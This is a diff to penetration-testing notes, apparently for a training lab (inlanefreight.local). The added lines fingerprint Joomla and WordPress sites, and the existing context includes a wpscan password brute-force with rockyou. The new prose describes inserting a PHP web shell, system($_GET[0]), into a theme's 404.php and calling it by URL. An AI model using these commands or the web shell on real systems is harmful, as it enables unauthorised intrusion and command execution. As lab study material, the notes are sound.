@@ -81,14 +81,30 @@ curl -s http://blog.inlanefreight.local | grep WordPress
 curl -s http://blog.inlanefreight.local/ | grep themes
 curl -s http://blog.inlanefreight.local/ | grep plugins
 curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
+curl -s http://dev.inlanefreight.local/ | grep Joomla
+curl -s http://dev.inlanefreight.local/README.txt | head -n 5
+curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
 wpscan --url http://blog.inlanefreight.local --enumerate
 wpscan --password-attack xmlrpc -t 20 -U duog -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
 wpscan --url http://target --enumerate vp,vt,u
 ```
 
 ```bash
+sudo pip3 install droopescan
+droopescan scan joomla --url http://dev.inlanefreight.local/
+droopescan scan wordpress --url http://blog.inlanefreight.local/
 droopescan scan drupal -u http://target
 ```
+An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.
+
+Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.
+
+        php
+system($_GET[0]);
+
+The code above should let us execute commands via the GET parameter 0. We add this single line to the file just below the comments to avoid too much modification of the contents.
+Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using cURL. As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target
+http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
 
 ---
 
